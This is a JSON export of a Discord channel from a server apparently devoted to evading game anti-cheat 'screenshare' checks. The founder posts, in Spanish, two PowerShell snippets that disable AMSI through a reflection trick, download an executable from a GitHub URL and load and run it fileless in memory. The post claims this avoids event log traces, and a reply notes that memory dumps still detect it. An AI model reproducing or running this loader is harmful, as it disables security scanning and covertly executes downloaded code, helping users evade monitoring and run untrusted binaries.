@@ -1,0 +1,87 @@
+{
+  "guild": {
+    "id": "1385680731212218449",
+    "name": "Bypass Screenshare",
+    "iconUrl": "https://cdn.discordapp.com/icons/1385680731212218449/3be219b22eb8a5390cc8b0c1c31cf0c6.png?size=512"
+  },
+  "channel": {
+    "id": "1487622179825651752",
+    "type": "GuildTextChat",
+    "categoryId": "1461571659453563052",
+    "category": "metodos avanzados",
+    "name": "»「\uD83E\uDE9E」reflective-assembly-loading",
+    "topic": null
+  },
+  "dateRange": {
+    "after": null,
+    "before": null
+  },
+  "exportedAt": "2026-06-17T21:15:25.209099-03:00",
+  "messages": [
+    {
+      "id": "1487623313143496845",
+      "type": "Default",
+      "timestamp": "2026-03-28T22:23:56.558-03:00",
+      "timestampEdited": "2026-03-28T23:01:51.719-03:00",
+      "callEndedTimestamp": null,
+      "isPinned": false,
+      "content": "es parecido a #»「\uD83D\uDCC4」make-fileless , nada mas que este deja los logs al reves, dejas log en consolehost pero no en eventvwr, lo añado ya que a muchos se les facilita mas bypasear consolehosthistory antes que eventvwr\n\nsolo cambien la ruta del enlace para hacer su fileless\n\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n$bytes = (New-Object Net.WebClient).DownloadData('https://github.com/ccsgoq-byte/asdsa/raw/main/Sapphire_Clicker%20(OUTDATED%20LEAK).exe')\n$asm = [Reflection.Assembly]::Load($bytes)\n[System.Threading.Thread]::CurrentThread.SetApartmentState('STA')\ntry { $asm.EntryPoint.Invoke($null, @()) } catch { try { $asm.EntryPoint.Invoke($null, $null) } catch {} }\nAdd-Type -AssemblyName System.Windows.Forms\n[System.Windows.Forms.Application]::Run()\n\n\n\nejemplo 2:\n\n\n\n\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n$bytes = (New-Object Net.WebClient).DownloadData('https://github.com/ccsgoq-byte/asdash/raw/main/engouranceCS%20v1.3.exe')\n$asm = [Reflection.Assembly]::Load($bytes)\n[System.Threading.Thread]::CurrentThread.SetApartmentState('STA')\ntry { $asm.EntryPoint.Invoke($null, @()) } catch { try { $asm.EntryPoint.Invoke($null, $null) } catch {} }\nAdd-Type -AssemblyName System.Windows.Forms\n[System.Windows.Forms.Application]::Run()\n\n\nignoren el nombre del canal, ya se que es lo mismo que todos los fileless\nnada mas era para distinguir\n\ntambien bypasean memory/ram dump",
+      "author": {
+        "id": "1126370663553302559",
+        "name": "ccsgo.",
+        "discriminator": "0000",
+        "nickname": "Ccsgo",
+        "color": "#797878",
+        "isBot": false,
+        "roles": [
+          {
+            "id": "1489281259908894920",
+            "name": "Founder",
+            "color": "#797878",
+            "position": 32
+          }
+        ],
+        "avatarUrl": "https://cdn.discordapp.com/avatars/1126370663553302559/e9db7f5ae485572a9b3e657635636b85.png?size=512"
+      },
+      "attachments": [],
+      "embeds": [],
+      "stickers": [],
+      "reactions": [],
+      "mentions": [],
+      "inlineEmojis": []
+    },
+    {
+      "id": "1494425510254743703",
+      "type": "Default",
+      "timestamp": "2026-04-16T16:53:26.728-03:00",
+      "timestampEdited": null,
+      "callEndedTimestamp": null,
+      "isPinned": false,
+      "content": "Edit: si lo detecta ram/memory dump",
+      "author": {
+        "id": "1325712533633630309",
+        "name": "streaky_",
+        "discriminator": "0000",
+        "nickname": "♱",
+        "color": "#2C6D2C",
+        "isBot": false,
+        "roles": [
+          {
+            "id": "1485053790242476102",
+            "name": "Verified",
+            "color": "#2C6D2C",
+            "position": 2
+          }
+        ],
+        "avatarUrl": "https://cdn.discordapp.com/avatars/1325712533633630309/7bc3db982202dde546a52c03415297f1.png?size=512"
+      },
+      "attachments": [],
+      "embeds": [],
+      "stickers": [],
+      "reactions": [],
+      "mentions": [],
+      "inlineEmojis": []
+    }
+  ],
+  "messageCount": 2
+}
